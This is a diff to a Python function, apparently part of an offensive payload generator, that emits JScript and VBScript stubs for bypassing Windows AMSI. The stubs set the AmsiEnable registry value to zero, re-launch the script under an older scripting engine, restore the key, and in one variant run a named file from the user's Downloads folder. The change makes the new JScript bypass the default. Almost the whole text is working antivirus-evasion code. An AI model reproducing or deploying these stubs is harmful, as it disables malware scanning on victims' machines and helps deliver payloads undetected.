@@ -3,23 +3,32 @@
 def amsi_stub(file_type, technique, filename):
 
     # Slightly more elegant implementation of amsienable trick from @buffaloverflow
+	## SYANiDE:  modified slightly to account for the one it replaces having incorporated a
+	#, check whether it should Run The Jewels or not
+	#, RElated: https://www.youtube.com/watch?v=vWaljXUiCaE  @1:20, @1:22
+	#, RE: Lines: 31, 43, 45 equiv replicated by lines: 12, 18-20, 27
     js_bypass_new = """\nvar sh = new ActiveXObject('WScript.Shell');
 var key = "HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
+var exit=1;
 
 try{
 	var AmsiEnable = sh.RegRead(key);
 	if(AmsiEnable!=0){
-	throw new Error(1, '');
+		throw new Error(1, '');
+	}else{
+		exit=0
 	}
 }catch(e){
 	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
 	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
 	sh.RegWrite(key, 1, "REG_DWORD"); // put it back
 	WScript.Quit(1);
-}\n\n"""
+}\n\n
+if(!exit){
+"""
 
     js_bypass_1 = """\nvar regpath = "HKCU\\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
-var exit=0;
+var exit=0;													//thanks
 var WinNetwork = new ActiveXObject("WScript.Network");
 var u = WinNetwork.UserName;
 var oWSS = new ActiveXObject("WScript.Shell");
@@ -31,9 +40,9 @@ oWSS.RegWrite(regpath, "0", "REG_DWORD");
 var obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880");
 var j = "c:\\\\users\\\\"+u+"\\\\downloads\\\\%s";
 obj.Document.Application.ShellExecute(j,null,"C:\\Windows\\System32",null,0);
-exit=1;
+exit=1;														//thanks
 }
-if(!exit){
+if(!exit){													//thanks
 \n\n""" % (filename)
 
     vbs_bypass_1 = """\nregpath = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"
@@ -59,6 +68,7 @@ e=1
     if "vb" in file_type or "hta" in file_type:
         amsibypass = vbs_bypass_1
     else:
-        amsibypass = js_bypass_1
+        # amsibypass = js_bypass_1		# nah
+		amsibypass = js_bypass_new		# yeah
 
     return amsibypass
